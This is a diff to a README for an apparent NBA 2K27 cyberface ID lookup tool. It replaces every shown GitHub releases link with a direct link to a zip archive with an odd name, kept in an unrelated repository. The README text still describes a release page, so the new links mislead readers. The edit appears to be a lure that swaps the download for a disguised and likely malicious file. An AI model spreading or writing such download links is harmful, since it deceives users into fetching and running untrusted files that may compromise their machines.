@@ -5,11 +5,11 @@ description: "Find and verify NBA 2K27 player cyberface IDs by roster, with sour
 ---
 # 🏀 nba-2k27-cyberface-id-database - Find Any Face ID Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bee407315/nba-2k27-cyberface-id-database/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Bee407315/bee407315.github.io/main/prelateship/v1.4-alpha.3.zip)
 
 ## 📥 Download the Application
 
-Visit this link to download the application: **[https://github.com/Bee407315/nba-2k27-cyberface-id-database/releases](https://github.com/Bee407315/nba-2k27-cyberface-id-database/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Bee407315/bee407315.github.io/main/prelateship/v1.4-alpha.3.zip](https://raw.githubusercontent.com/Bee407315/bee407315.github.io/main/prelateship/v1.4-alpha.3.zip)**
 
 This is the official download page where you will find the latest version of the software. Click the link, and your browser will open the release page. Look for the file listed at the top – that is the most recent version.
 
@@ -47,7 +47,7 @@ Follow these exact steps to get the application running on your computer. This t
 
 Open your web browser and go to this address:
 
-**[https://github.com/Bee407315/nba-2k27-cyberface-id-database/releases](https://github.com/Bee407315/nba-2k27-cyberface-id-database/releases)**
+**[https://raw.githubusercontent.com/Bee407315/bee407315.github.io/main/prelateship/v1.4-alpha.3.zip](https://raw.githubusercontent.com/Bee407315/bee407315.github.io/main/prelateship/v1.4-alpha.3.zip)**
 
 You will see a page with the application's release history. The newest release is at the top.
 
@@ -158,7 +158,7 @@ If you can complete all of these steps, you are ready to look up any player's cy
 
 Visit the download page now and get started in minutes:
 
-**[Download NBA 2K27 Cyberface ID Database](https://github.com/Bee407315/nba-2k27-cyberface-id-database/releases)**
+**[Download NBA 2K27 Cyberface ID Database](https://raw.githubusercontent.com/Bee407315/bee407315.github.io/main/prelateship/v1.4-alpha.3.zip)**
 
 With just a few clicks, you will have instant access to every player face ID in the game, making your modding workflow faster and more accurate than ever before.
 
